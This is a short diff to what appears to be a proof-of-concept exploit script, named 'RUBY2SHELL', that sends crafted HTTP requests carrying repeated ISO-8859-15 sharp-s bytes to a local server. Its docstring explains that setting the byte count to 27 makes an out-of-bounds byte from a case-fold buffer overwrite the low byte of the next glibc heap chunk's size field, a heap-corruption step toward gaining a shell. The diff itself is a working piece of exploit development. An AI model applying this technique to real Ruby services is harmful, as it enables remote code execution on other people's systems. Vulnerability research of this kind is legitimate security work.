@@ -23,6 +23,9 @@ W378 adds `RUBY2SHELL_W378_COUNT` (default 1) to repeat a surface over that
 many fresh loopback connections against ONE server process.
 W378 also adds `method-postfield-size-alt`, the same shape tagged
 ISO-8859-15, so two folds in one process produce distinct case_map frames.
+W380 adds `RUBY2SHELL_W380_COUNT` (default 21) to choose the odd sharp-s
+count on the wire; 27 makes the fold buffer's OOB byte land on the next
+glibc chunk's size LSB instead of its ignored slack/prev_size bytes.
 """
 
 import hashlib
@@ -32,7 +35,9 @@ import sys
 
 HOST = "127.0.0.1"
 PATH = b"/up"
-N = 21
+N = int(os.environ.get("RUBY2SHELL_W380_COUNT", "21"))
+if N < 2:
+    raise ValueError("RUBY2SHELL_W380_COUNT must be >= 2")
 SHARP = b"\xdf" * N
 PCT = b"%DF" * N
 ODD = b"a" + SHARP
